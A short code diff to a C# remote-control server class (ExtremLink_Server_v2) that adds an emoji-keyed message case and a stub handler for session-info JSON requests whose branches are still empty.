@@ -200,6 +200,9 @@ namespace ExtremLink_Server_v2.Classes
                     case "^":
                         this.HandleKeyboardMessages(data);
                         break;
+                    case "📹🕑":
+                        this.HandleSessionInfoMessage(data);
+                        break;
                 }
             }
         }
@@ -369,7 +372,23 @@ namespace ExtremLink_Server_v2.Classes
             this.victim.SendTCPMessageToClient("⌨", data);
         }
 
+        // Handling Session info retrieve command function:
+        private void HandleSessionInfoMessage(string data)
+        {
+            // Input: A string which represents a message about session from a user.
+            // Output: The function handles with the given message.
+            dynamic message = JsonConvert.DeserializeObject(data);
+            JObject jsonData = (JObject)message;
+            switch (message.requestType)
+            {
+                case "GetSessionProperties":
 
+                    break;
+                case "GetSessionContent":
+
+                    break;
+            }
+        }
 
         // Getting frames function:
         public byte[] GetFrame()
